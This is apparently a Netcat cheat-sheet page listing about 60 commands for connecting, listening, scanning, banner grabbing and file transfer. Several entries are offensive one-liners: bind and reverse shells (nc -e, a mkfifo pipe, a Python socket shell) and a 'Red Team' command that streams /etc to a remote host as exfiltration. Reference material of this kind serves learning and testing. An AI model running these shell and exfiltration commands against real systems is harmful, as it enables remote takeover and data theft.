# Netcat

> The TCP/IP Swiss-army knife: connect to and listen on ports, transfer files, banner-grab and catch reverse shells.

- Category: Utilities
- Commands: 60
- Page: https://terminal.rokibulroni.com/tool/utilities/Netcat
- Homepage: https://nmap.org/ncat/
- Documentation: https://nmap.org/ncat/guide/
- Tags: networking, shells, file transfer

## Install

- apt: `sudo apt install netcat-openbsd ncat`
- brew: `brew install netcat`

## Basic TCP Connections

### nc 192.168.1.1 80

```bash
nc 192.168.1.1 80
```

Connects to the target host on port 80 using TCP.

### nc -v 192.168.1.1 22

```bash
nc -v 192.168.1.1 22
```

Connects to the target with verbose output to see connection status.

### nc -v -n 192.168.1.1 80

```bash
nc -v -n 192.168.1.1 80
```

Connects without performing DNS resolution for faster interaction.


## UDP Connections

### nc -u 192.168.1.1 53

```bash
nc -u 192.168.1.1 53
```

Establishes a connection using UDP instead of the default TCP.

### nc -u -v 192.168.1.1 161

```bash
nc -u -v 192.168.1.1 161
```

Connects via UDP with verbose feedback to check connection status.


## Listening Mode

### nc -l -p 4444

```bash
nc -l -p 4444
```

Starts a listener on TCP port 4444 to await incoming connections.

### nc -l -v -p 4444

```bash
nc -l -v -p 4444
```

Listens on port 4444 and prints verbose details when a client connects.

### nc -u -l -p 5000

```bash
nc -u -l -p 5000
```

Starts a UDP listener on port 5000 for receiving UDP packets.


## Port Scanning

### nc -z -v 192.168.1.1 20-80

```bash
nc -z -v 192.168.1.1 20-80
```

Scans TCP ports 20 through 80 in Zero-I/O mode to identify open ports.

### nc -z -v -u 192.168.1.1 1-100

```bash
nc -z -v -u 192.168.1.1 1-100
```

Scans UDP ports 1 through 100 to identify listening services.

### nc -z -v -w 1 192.168.1.1 80 443 8080

```bash
nc -z -v -w 1 192.168.1.1 80 443 8080
```

Scans specific individual ports with a 1-second timeout per port.


## Banner Grabbing

### echo '' | nc -v -n -w 1 192.168.1.1 22

```bash
echo '' | nc -v -n -w 1 192.168.1.1 22
```

Connects briefly to capture the service banner sent by the target.

### printf 'HEAD / HTTP/1.0\r\n\r\n' | nc 192.168.1.1 80

```bash
printf 'HEAD / HTTP/1.0\r\n\r\n' | nc 192.168.1.1 80
```

Sends a raw HTTP HEAD request to grab the web server version header.


## File Transfer (Receive)

### nc -l -p 1234 > received_file.txt

```bash
nc -l -p 1234 > received_file.txt
```

Listens on port 1234 and writes all incoming data to a file.


## File Transfer (Send)

### nc 192.168.1.1 1234 < file_to_send.txt

```bash
nc 192.168.1.1 1234 < file_to_send.txt
```

Connects to the receiver and sends the contents of a local file.


## Timeout and Connection Control

### nc -w 5 192.168.1.1 80

```bash
nc -w 5 192.168.1.1 80
```

Connects to the target but times out if the connection remains idle for 5 seconds.


## Input and Output Redirection

### nc 192.168.1.1 25 << EOF

```bash
nc 192.168.1.1 25 << EOF
HELO test.com
QUIT
EOF
```

Feeds a multi-line HERE-doc string into the netcat connection automatically.


## Keep Alive and Persistent Connections

### nc -k -l -p 8080

```bash
nc -k -l -p 8080
```

Listens on port 8080 and keeps listening even after the client disconnects.


## Source Port and Interface Binding

### nc -p 5000 192.168.1.1 80

```bash
nc -p 5000 192.168.1.1 80
```

Connects to the target while forcing the local source port to be 5000.

### nc -s 10.10.10.10 192.168.1.1 80

```bash
nc -s 10.10.10.10 192.168.1.1 80
```

Spoofs or binds the source IP address to a specific interface IP.


## IPv6 Connections

### nc -6 2001:db8::1 80

```bash
nc -6 2001:db8::1 80
```

Forces Netcat to use IPv6 protocols to connect to the target address.

### nc -6 -l -p 5000

```bash
nc -6 -l -p 5000
```

Starts a listener specifically on an IPv6 address/interface on port 5000.


## Quiet and Verbose Modes

### nc -vv 192.168.1.1 80

```bash
nc -vv 192.168.1.1 80
```

Connects with very verbose output for deep debugging of the connection handshake.


## Automation and Scripting Usage

### nc -i 2 192.168.1.1 80

```bash
nc -i 2 192.168.1.1 80
```

Inserts a 2-second delay interval between lines of text sent or received.


## Executing Commands (Bind Shell)

### nc -l -p 4444 -e /bin/bash

```bash
nc -l -p 4444 -e /bin/bash
```

Listens on port 4444 and executes bash for whoever connects (insecure).


## Executing Commands (Reverse Shell)

### nc 10.10.10.10 4444 -e /bin/bash

```bash
nc 10.10.10.10 4444 -e /bin/bash
```

Connects to a listener and executes a shell, sending control to the remote user.


## Executing Commands (OpenBSD Workaround)

### rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 > /tmp/f

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 > /tmp/f
```

Creates a reverse shell using named pipes for Netcat versions without the -e flag.


## Debugging and Troubleshooting

### nc -v -z -w 2 192.168.1.1 1-65535

```bash
nc -v -z -w 2 192.168.1.1 1-65535
```

Performs a full TCP port scan with verbose output to identify all open services.


## Firewall and Service Testing

### nc -l -p 80

```bash
nc -l -p 80
```

Example:

```bash
sudo nc -l -p 80
```

Simulates a web server listener to test if a firewall permits inbound port 80 traffic.


## Encryption via External Tools

### ncat --ssl -l -p 4444

```bash
ncat --ssl -l -p 4444
```

Uses Nmap's Ncat (modern sibling) to listen with SSL encryption enabled.

### ncat --ssl 192.168.1.1 4444

```bash
ncat --ssl 192.168.1.1 4444
```

Connects to an SSL-enabled listener using Nmap's Ncat variant.


## Proxy Usage

### nc -x 127.0.0.1:9050 -X 5 192.168.1.1 80

```bash
nc -x 127.0.0.1:9050 -X 5 192.168.1.1 80
```

Connects to the target via a SOCKS5 proxy (e.g., Tor) at the specified address.

### nc -x 10.10.10.1:8080 -X connect 192.168.1.1 80

```bash
nc -x 10.10.10.1:8080 -X connect 192.168.1.1 80
```

Connects to the target via an HTTP CONNECT proxy.


## Unix Domain Sockets

### nc -U /var/run/docker.sock

```bash
nc -U /var/run/docker.sock
```

Example:

```bash
sudo nc -U /var/run/docker.sock
```

Connects to a Unix Domain Socket instead of a network TCP/UDP port.

### nc -l -U /tmp/socket_test

```bash
nc -l -U /tmp/socket_test
```

Creates and listens on a Unix Domain Socket for local inter-process communication.


## Logging and Output Handling

### nc -v 192.168.1.1 80 2> connection_log.txt

```bash
nc -v 192.168.1.1 80 2> connection_log.txt
```

Redirects verbose status messages (stderr) to a log file while keeping data on stdout.


## Red Team Post Exploitation

### tar cf - /etc | nc 10.10.10.10 1234

```bash
tar cf - /etc | nc 10.10.10.10 1234
```

Compresses the /etc directory and streams it directly to a remote listener (Data Exfiltration).

### nc -l -p 1234 | tar xf -

```bash
nc -l -p 1234 | tar xf -
```

Listens for an incoming stream and immediately extracts the archive to disk.

### dd if=/dev/sda | nc 10.10.10.10 9000

```bash
dd if=/dev/sda | nc 10.10.10.10 9000
```

Clones a raw disk image and streams it over the network for forensic capture.


## Blue Team Validation

### while true; do nc -l -p 80 -q 1 < response.html; done

```bash
while true; do nc -l -p 80 -q 1 < response.html; done
```

Runs a simple loop to serve a static HTML file persistently (Simple Web Server).

### nc -z 192.168.1.1 1-1024 2>&1 | grep succeeded

```bash
nc -z 192.168.1.1 1-1024 2>&1 | grep succeeded
```

Scans ports and filters output to show only successfully connected ports.


## Chat Mode

### nc -l -p 3333

```bash
nc -l -p 3333
```

Example:

```bash
User A: nc -l -p 3333
```

Starts a simple text chat server.

### nc 192.168.1.1 3333

```bash
nc 192.168.1.1 3333
```

Example:

```bash
User B: nc 192.168.1.1 3333
```

Connects to the chat server for manual text communication.


## Advanced Triggering

### nc -l -p 5555 -c '/bin/bash script.sh'

```bash
nc -l -p 5555 -c '/bin/bash script.sh'
```

Executes a shell script via /bin/sh upon connection (Traditional netcat only).


## Port Scanning (Randomized)

### nc -v -r -z 192.168.1.1 20-80

```bash
nc -v -r -z 192.168.1.1 20-80
```

Scans ports 20-80 in a randomized order to potentially evade simple detection logic.


## Connection Control

### nc -q 5 192.168.1.1 80 < input.txt

```bash
nc -q 5 192.168.1.1 80 < input.txt
```

Sends a file and waits 5 seconds after EOF before closing the connection.


## Broadcast

### nc -b -u 255.255.255.255 1234

```bash
nc -b -u 255.255.255.255 1234
```

Allows sending UDP packets to the broadcast address (requires support in binary).


## Telnet Negotiation

### nc -t 192.168.1.1 23

```bash
nc -t 192.168.1.1 23
```

Enables Telnet negotiation handling for connecting to Telnet servers.


## Buffer Size Adjustment

### nc -I 1024 192.168.1.1 80

```bash
nc -I 1024 192.168.1.1 80
```

Sets the TCP receive buffer size to 1024 bytes (useful for flow control testing).


## Listening Mode (No DNS)

### nc -n -l -p 4444

```bash
nc -n -l -p 4444
```

Listens on port 4444 and prevents DNS lookup of the connecting IP for speed.


## Port Scanning (Wait Mode)

### nc -w 1 -z 192.168.1.1 80-85

```bash
nc -w 1 -z 192.168.1.1 80-85
```

Scans a small range with a strict 1-second timeout per port to prevent hanging.


## Simple HTTP Server

### printf 'HTTP/1.1 200 OK\n\nHello World' | nc -l -p 8080

```bash
printf 'HTTP/1.1 200 OK\n\nHello World' | nc -l -p 8080
```

Responds with a valid HTTP 200 OK message to a single browser request.


## Mail Server Testing

### nc -C 192.168.1.1 25

```bash
nc -C 192.168.1.1 25
```

Connects to SMTP and forces CRLF line endings (required by some mail servers).


## Reverse Shell (Python Assisted)

### python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444)

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Example:

```bash
python -c '...' (See command field)
```

Uses Python to spawn a reverse shell if Netcat -e is unavailable.


## Monitoring

### nc -l -p 514 | tee syslog_capture.log

```bash
nc -l -p 514 | tee syslog_capture.log
```

Example:

```bash
nc -l -u -p 514 | tee syslog_capture.log
```

Acts as a Syslog receiver on UDP 514 and displays logs while saving to file.


## Background Listening

### nc -d -l -p 1234

```bash
nc -d -l -p 1234
```

Listens on port 1234 but ignores stdin (prevents closing on terminal input).


## Connection Control (Shutdown)

### nc -N 192.168.1.1 80

```bash
nc -N 192.168.1.1 80
```

Example:

```bash
echo 'GET / HTTP/1.0' | nc -N 192.168.1.1 80
```

Shutdowns the network socket for writing after stdin closes (useful for HTTP).


## Traffic Shaping

### nc -T lowdelay 192.168.1.1 80

```bash
nc -T lowdelay 192.168.1.1 80
```

Sets the IP TOS (Type of Service) byte to 'lowdelay' for traffic prioritization.


## Proxy Usage (SOCKS4)

### nc -x 127.0.0.1:1080 -X 4 192.168.1.1 80

```bash
nc -x 127.0.0.1:1080 -X 4 192.168.1.1 80
```

Connects to the target through a specific SOCKS4 proxy.


## Advanced Relaying

### mknod backpipe p && nc -l -p 8080 0<backpipe | nc 192.168.1.1 80 1>backpipe

```bash
mknod backpipe p && nc -l -p 8080 0<backpipe | nc 192.168.1.1 80 1>backpipe
```

Creates a manual port forwarder using a named pipe to relay traffic between ports.

## Related tools

- [socat](https://terminal.rokibulroni.com/tool/utilities/socat)
- [curl](https://terminal.rokibulroni.com/tool/utilities/curl)
- [SSH](https://terminal.rokibulroni.com/tool/lateral/ssh)
